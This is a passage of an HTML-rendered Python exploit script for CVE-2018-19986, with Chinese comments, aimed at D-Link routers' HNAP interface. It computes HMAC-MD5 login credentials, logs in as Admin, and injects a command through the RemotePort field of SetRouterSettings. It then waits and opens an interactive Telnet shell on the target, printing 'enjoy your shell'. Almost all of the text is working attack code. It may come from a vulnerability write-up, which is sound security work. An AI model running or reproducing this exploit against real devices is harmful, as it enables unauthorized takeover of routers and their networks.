data.find(&quot;&lt;/Challenge&gt;&quot;)])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">cookie = data[data.find(&quot;&lt;Cookie&gt;&quot;) + 8: data.find(&quot;&lt;/Cookie&gt;&quot;)]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">publicKey = str(data[data.find(&quot;&lt;PublicKey&gt;&quot;) + 11: data.find(&quot;&lt;/PublicKey&gt;&quot;)])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">privateKey = hmac_md5(publicKey + adminPw, challenge).hexdigest().upper()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">password = hmac_md5(privateKey, challenge).hexdigest().upper()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#</span><span class="cs7FFD2630">构造</span><span class="cs9FB05234">action</span><span class="cs7FFD2630">为</span><span class="cs9FB05234">login</span><span class="cs7FFD2630">的请求，发送用户名和口令</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;HNAP_AUTH&quot;] = HNAP_AUTH(&quot;Login&quot;, privateKey)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;Cookie&quot;] = &quot;uid=&quot; + cookie</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload = &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;Login xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;&lt;Action&gt;login&lt;/Action&gt;&lt;Username&gt;Admin&lt;/Username&gt;&lt;LoginPassword&gt;&#39;+password+&#39;&lt;/LoginPassword&gt;&lt;Captcha&gt;&lt;/Captcha&gt;&lt;/Login&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r = requests.post(&#39;http://&#39;+IP+&#39;/HNAP1/&#39;, headers=headers, data=payload)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#</span><span class="cs7FFD2630">登录成功后访问</span><span class="cs9FB05234">SetRouterSettings</span><span class="cs7FFD2630">设置路由器的一些配置，其中</span><span class="cs9FB05234">RemotePort</span><span class="cs7FFD2630">被设置为</span><span class="cs9FB05234">command</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;Origin&quot;] = &quot;http://&quot; + IP</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;HNAP_AUTH&quot;] = HNAP_AUTH(&quot;SetRouterSettings&quot;, privateKey)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;SOAPaction&quot;] = &#39;&quot;http://purenetworks.com/HNAP1/SetRouterSettings&quot;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">headers[&quot;Accept&quot;] = &quot;text/xml&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">payload = open(&#39;{}.xml&#39;.format(&quot;CVE-2018-19986&quot;)).read().replace(&#39;ip&#39;, IP).replace(&#39;COMMAND&#39;, command)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print &#39;[*] command injection&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r = requests.post(&#39;http://&#39;+IP+&#39;/HNAP1/&#39;, headers=headers, data=payload)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(r.text)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print &#39;[*] waiting 30 sec...&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">time.sleep(30)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">#</span><span class="cs7FFD2630">利用成功之后，服务端已经开启了</span><span class="cs9FB05234">Telnet</span><span class="cs7FFD2630">服务，攻击者可直接连服务器的</span><span class="cs9FB05234">Telnet</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print &#39;[*] enjoy your shell&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">telnetlib.Telnet(IP).interact(</span></p></body>
</html>
